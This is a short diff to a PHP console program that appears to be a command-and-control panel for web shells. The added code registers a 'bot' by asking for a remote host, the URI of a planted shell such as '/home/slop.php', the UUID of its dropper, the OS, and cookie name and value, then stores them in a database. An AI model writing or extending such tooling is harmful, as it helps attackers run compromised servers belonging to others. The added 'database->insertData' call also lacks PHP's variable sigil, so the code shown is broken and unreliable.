@@ -212,6 +212,17 @@ HELPER.PHP_EOL;
         case str_starts_with($c, "a") !== false:
             system(CLEAR);
             $m->addHostMenu();
+            database->insertData(
+                [
+                    "action" => "add_bot",
+                    "rhost" => trim(readline("Remote host: ")),
+                    "uri" => trim(readline("URI (example: /home/slop.php)")),
+                    "uuid" => trim(readline("UUID (should be the uuid associated with the dropper/shell in the database.): ")),
+                    "os_flavor" => trim(readline("OS: ")),
+                    "cname" => trim(readline("CNAME: ")),
+                    "cval" => trim(readline("CVAL: ")),
+                ]
+            );
             break;
         case str_starts_with($c, "cr") !== false:
             system(CLEAR);
